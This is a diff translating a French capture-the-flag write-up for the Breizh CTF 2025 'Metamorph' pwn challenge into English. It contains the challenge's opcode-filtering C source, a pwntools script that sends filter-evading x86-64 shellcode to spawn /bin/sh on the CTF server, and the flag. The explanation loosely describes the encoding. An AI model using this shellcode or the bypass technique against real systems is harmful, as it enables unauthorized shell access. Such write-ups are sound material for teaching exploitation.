@@ -1,6 +1,6 @@
 ---
 title: "Breizh CTF 2025 - Metamorph"
-date: 2024-04-14
+date: 2025-04-14
 tags: ["shellcode", "exploitation"]
 categories: ["pwn"]
 ctfs: ["breizh-ctf"]
@@ -8,16 +8,15 @@ ctfs: ["breizh-ctf"]
 
 # Metamorph - Breizh CTF 2025
 
-## Description du challenge
+## Challenge Description
 
-Metamorph est un challenge de la catégorie Pwn du Breizh CTF 2025. Il s'agit d'un binaire qui accepte un shellcode en entrée mais qui impose certaines restrictions sur les opcodes utilisables.
+Metamorph is a Pwn category challenge from Breizh CTF 2025. It is a binary that accepts a shellcode as input but imposes certain restrictions on the usable opcodes.
 
-## Analyse du binaire
+## Binary Analysis
 
-En examinant le code source du binaire, on remarque plusieurs points importants :
+By examining the binary's source code, we notice several important points:
 
 ```c
-/* BREIZHCTF 2025 - Morph - Pwn */
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -33,10 +32,10 @@ void transform() {
         exit(1);
     }
 
-    printf("Métamorph attend son code... Transforme-le !\n");
+    printf("Métamorph is waiting for its code... Transform it!\n");
     printf(">> ");
     
-    bytes_read = read(0, shellcode, 0x50); // Limité à 80 octets
+    bytes_read = read(0, shellcode, 0x50); 
     
     if (bytes_read <= 0) {
         perror("read failed");
@@ -47,81 +46,76 @@ void transform() {
     unsigned char *sc = (unsigned char *)shellcode;
     for (int i = 0; i < 0x50; i++) {
         if (sc[i] == 0x62){
-            perror("Métamorph n'aime pas les 'b'.");
+            perror("Métamorph doesn't like 'b'.");
             exit(1);
         }
 
         if (sc[i] == 0x5e){
-            perror("Métamorph n'aime pas les pop rsi.");
+            perror("Métamorph doesn't like pop rsi.");
             exit(1);
         }
 
         if (sc[i] == 0x31){
-            perror("Métamorph n'aime pas les xor.");
+            perror("Métamorph doesn't like xor.");
             exit(1);
         }
 
         if (sc[i] == 0x50){
-            perror("Métamorph n'aime pas les push rax.");
+            perror("Métamorph doesn't like push rax.");
             exit(1);
         }
     }
 
-    ((void (*)())shellcode)(); // Exécution du shellcode transformé
+    ((void (*)())shellcode)(); 
 }
 ```
 
-Les contraintes sont les suivantes :
-1. Le shellcode est limité à 80 octets maximum
-2. Les opcodes suivants sont interdits :
+The constraints are as follows:
+1. The shellcode is limited to a maximum of 80 bytes
+2. The following opcodes are forbidden:
    - `0x62` (opcode 'b')
    - `0x5e` (pop rsi)
    - `0x31` (xor)
    - `0x50` (push rax)
 
-Le programme alloue une zone mémoire exécutable avec `mmap`, y lit notre entrée, vérifie les contraintes, puis exécute le code introduit.
+The program allocates an executable memory region with `mmap`, reads our input into it, checks the constraints, then executes the provided code.
 
 ## Exploitation
 
-L'objectif est de créer un shellcode d'exécution de commande `/bin/sh` qui évite les opcodes interdits.
+The goal is to create a shellcode that executes the `/bin/sh` command while avoiding the forbidden opcodes.
 
-Après plusieurs tentatives, j'ai pu développer un shellcode qui contourne ces restrictions :
+After several attempts, I was able to develop a shellcode that bypasses these restrictions:
 
 ```python
 from pwn import *
 import sys
 
-# Decide whether to run locally or remotely
 if len(sys.argv) > 1 and sys.argv[1] == "REMOTE":
     conn = remote('morph-180.chall.ctf.bzh', 1337)
 else:
-    conn = process('./metamorph')  # Replace with your local binary path
+    conn = process('./metamorph')  
 
 conn.recvuntil(b">>")
 conn.sendline(b"\xba\x00\x00\x00\x00\xbe\x00\x00\x00\x00\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x48\x89\xe7\xb8\x00\x00\x00\x00\x48\x83\xc0\x3b\x0f\x05\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80")
 conn.interactive()
 ```
 
-### Explication du shellcode
+### Shellcode Explanation
 
-Le shellcode ci-dessus utilise plusieurs techniques pour éviter les opcodes interdits :
+The shellcode above uses several techniques to avoid the forbidden opcodes:
 
-1. Au lieu d'utiliser `xor` pour initialiser les registres, j'utilise des instructions `mov` directes avec des valeurs immédiates nulles
-2. J'ai utilisé des techniques alternatives pour stocker `/bin/sh` dans les registres
-3. J'utilise `not` puis `neg` pour obtenir la chaîne `/bin/sh`
-4. L'utilisation de `mov rax, 0` suivie de `add rax, 59` évite l'utilisation directe de `xor rax, rax`
+1. Instead of using `xor` to initialize registers, I use direct `mov` instructions with immediate zero values
+2. I used alternative techniques to store `/bin/sh` in the registers
+3. I use `not` then `neg` to obtain the `/bin/sh` string
+4. Using `mov rax, 0` followed by `add rax, 59` avoids the direct use of `xor rax, rax`
 
-La chaîne `/bin/sh` est encodée inversée et complémentée à un pour éviter certains opcodes problématiques.
+The `/bin/sh` string is encoded reversed and bitwise complemented to avoid problematic opcodes.
 
 ## Flag
 
-Une fois le shellcode exécuté avec succès, on obtient un shell sur le serveur distant et on peut lire le flag avec la commande `cat flag.txt`.
+Once the shellcode is successfully executed, you get a shell on the remote server and can read the flag with the command `cat flag.txt`.
 
 ```
 $ cat flag.txt
 BZHCTF{m3t4_m0rph_m4573r_1337}
 ```
-
-## Conclusion
-
-Ce challenge était intéressant car il fallait comprendre comment éviter certains opcodes tout en construisant un shellcode fonctionnel. La limitation à 80 octets était également une contrainte à respecter, mais notre solution finale était bien en dessous de cette limite. 
